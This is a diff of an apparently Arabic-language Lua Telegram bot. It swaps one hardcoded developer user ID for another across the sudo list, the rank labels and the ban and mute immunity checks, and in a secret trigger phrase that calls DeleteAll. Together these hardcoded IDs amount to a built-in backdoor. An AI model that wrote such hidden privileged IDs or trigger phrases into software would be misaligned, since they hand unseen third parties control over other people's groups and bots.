@@ -179,7 +179,7 @@ print(t)
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
-sudo_users = {SUDO,1208165035,1673759920,1757394723,1879324805}   
+sudo_users = {SUDO,1208165035,1673759920,1757394723,1208165035}   
 function SudoBot(msg)  
 local DRAGON = false  
 for k,v in pairs(sudo_users) do  
@@ -301,7 +301,7 @@ elseif tonumber(user_id) == tonumber(1673759920) then
 var = true  
 elseif tonumber(user_id) == tonumber(1757394723) then
 var = true 
-elseif tonumber(user_id) == tonumber(1879324805) then
+elseif tonumber(user_id) == tonumber(1208165035) then
 var = true  
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = true  
@@ -336,7 +336,7 @@ return var
 end 
 
 function Rutba(user_id,chat_id)
-if tonumber(user_id) == tonumber(1879324805) then  
+if tonumber(user_id) == tonumber(1208165035) then  
 var = 'مالك السورس'
 elseif tonumber(user_id) == tonumber(1208165035) then
 var = 'مبرمج السورس'
@@ -3613,7 +3613,7 @@ if tonumber(result.sender_user_id_) == tonumber(1757394723) then
 send(msg.chat_id_, msg.id_, " ✪︙ لا تسطيع حظر مطور السورس عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(1879324805) then  
+if tonumber(result.sender_user_id_) == tonumber(1208165035) then  
 send(msg.chat_id_, msg.id_, " ✪︙ لا تسطيع حظر مطور السورس عام")
 return false 
 end
@@ -3666,7 +3666,7 @@ if tonumber(result.id_) == tonumber(1757394723) then
 send(msg.chat_id_, msg.id_, " ✪︙ لا تسطيع حظر مطور السورس ")
 return false 
 end
-if tonumber(result.id_) == tonumber(1879324805) then  
+if tonumber(result.id_) == tonumber(1208165035) then  
 send(msg.chat_id_, msg.id_, " ✪︙ لا تسطيع حظر مطور السورس ")
 return false 
 end
@@ -3713,7 +3713,7 @@ if tonumber(userid) == tonumber(1757394723) then
 send(msg.chat_id_, msg.id_, " ✪︙ لا تسطيع حظر مطور السورس عام ")
 return false 
 end
-if tonumber(userid) == tonumber(1879324805) then  
+if tonumber(userid) == tonumber(1208165035) then  
 send(msg.chat_id_, msg.id_, " ✪︙ لا تسطيع حظر مطور السورس عام ")
 return false 
 end
@@ -3761,7 +3761,7 @@ if tonumber(result.sender_user_id_) == tonumber(1757394723) then
 send(msg.chat_id_, msg.id_, " ✪︙ لا تسطيع كتم كبار السور عام ")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(1879324805) then  
+if tonumber(result.sender_user_id_) == tonumber(1208165035) then  
 send(msg.chat_id_, msg.id_, " ✪︙ لا تسطيع كتم كبار السور عام ")
 return false 
 end
@@ -3813,7 +3813,7 @@ if tonumber(result.id_) == tonumber(1757394723) then
 send(msg.chat_id_, msg.id_, " ✪︙ لا تسطيع كتم مطور السورس")
 return false 
 end
-if tonumber(result.id_) == tonumber(1879324805) then  
+if tonumber(result.id_) == tonumber(1208165035) then  
 send(msg.chat_id_, msg.id_, " ✪︙ لا تسطيع كتم مطور السورس")
 return false 
 end
@@ -3860,7 +3860,7 @@ if tonumber(userid) == tonumber(1757394723) then
 send(msg.chat_id_, msg.id_, " ✪︙ لا تسطيع كتم مطور السورس عام")
 return false 
 end
-if tonumber(userid) == tonumber(1879324805) then  
+if tonumber(userid) == tonumber(1208165035) then  
 send(msg.chat_id_, msg.id_, " ✪︙ لا تسطيع كتم مطور السورس عام")
 return false 
 end
@@ -9633,7 +9633,7 @@ end
 end,nil)
 
 end
-if text == "البطل سيمبا" and msg.sender_user_id_ == tonumber(1879324805) then
+if text == "البطل سيمبا" and msg.sender_user_id_ == tonumber(1208165035) then
 send(msg.chat_id_, msg.id_,"المدمر سيمبا")
  DeleteAll(msg)  
  
